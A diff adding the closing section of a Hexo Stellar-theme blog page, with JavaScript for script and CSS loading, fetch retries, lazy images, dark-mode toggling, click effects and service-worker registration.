+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js"></script>
+
+<!-- Special Days - 节日彩蛋系统 -->
+<script src="/js/plugins/special-days.js"></script>
+
+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+<!-- Random Cover Image -->
+<script>
+(function() {
+  function refreshRandomCovers() {
+    var images = document.querySelectorAll('img[src*="loliapi.com"]');
+    images.forEach(function(img) {
+      var src = img.src;
+      var baseSrc = src.split('?')[0];
+      img.src = baseSrc + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refreshRandomCovers);
+  } else {
+    refreshRandomCovers();
+  }
+})();
+</script>
+
+</div></body></html>
